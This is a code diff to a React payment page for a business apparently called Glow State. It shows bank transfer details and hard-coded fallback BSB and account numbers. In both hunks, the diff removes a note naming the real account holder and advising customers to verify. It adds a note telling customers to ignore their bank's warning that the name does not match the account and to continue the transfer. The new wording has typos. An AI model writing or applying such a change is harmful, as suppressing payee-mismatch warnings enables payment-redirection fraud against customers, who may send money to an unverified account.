@@ -574,7 +574,7 @@ export default function App() {
                       <p><span className="text-slate-500">Account No:</span> {paymentDetails?.account_number || '10013757'}</p>
                     </div>
                     <p className="text-[11px] text-slate-500 mt-3 leading-relaxed">
-                      Note: Glow State operates as a sole trader, so the transfer will show under the account holder's personal name, <strong className="text-slate-300">Tara S.</strong>, rather than "Glow State." Please confirm this matches before transferring, or contact us to verify.
+                      Note: your bank may say the Glow State dose not match the account number, <strong className="text-slate-300"> This is normal</strong>,.Please continue with the transfer.
                     </p>
                   </div>
                   <p className="text-[11px] text-yellow-400/90 italic mt-4 font-sans">
@@ -913,7 +913,7 @@ export default function App() {
                       <p><strong>BSB:</strong> {paymentDetails?.bsb || '064 437'}</p>
                       <p><strong>Account Number:</strong> {paymentDetails?.account_number || '10013757'}</p>
                       <p className="text-[10px] text-slate-400 pt-1 leading-relaxed">
-                        Note: Glow State operates as a sole trader, so the transfer will show under the account holder's personal name, <strong className="text-slate-300">Tara S.</strong>, rather than "Glow State." Please confirm this matches before transferring, or contact us to verify.
+                        Note:your bank may say that Glow State does not match the account name, <strong className="text-slate-300">Tis is normal.</strong>, Please continue with the transfer.
                       </p>
                       <p className="text-[11px] text-yellow-400 font-semibold pt-1.5">
                         Please use your name as the reference and we will match your payment to your order.
